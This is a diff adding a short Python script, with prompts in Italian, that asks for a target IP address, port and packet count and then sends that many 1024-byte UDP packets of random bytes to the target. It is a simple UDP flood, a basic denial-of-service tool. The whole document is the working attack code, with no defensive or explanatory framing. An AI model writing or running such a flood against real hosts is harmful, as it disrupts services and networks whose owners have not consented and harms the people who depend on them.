@@ -1,0 +1,15 @@
+import socket
+import random
+
+target_ip = input("Inserisci l'indirizzo IP target: ")
+target_port = int(input("Inserisci la porta target: "))
+num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
+
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+for i in range(num_packets):
+    packet_data = bytearray(random.getrandbits(8) for _ in range(1024))
+    client_socket.sendto(packet_data, (target_ip, target_port))
+    print(f"Pacchetto {i+1} inviato al target {target_ip}:{target_port}")
+
+client_socket.close()
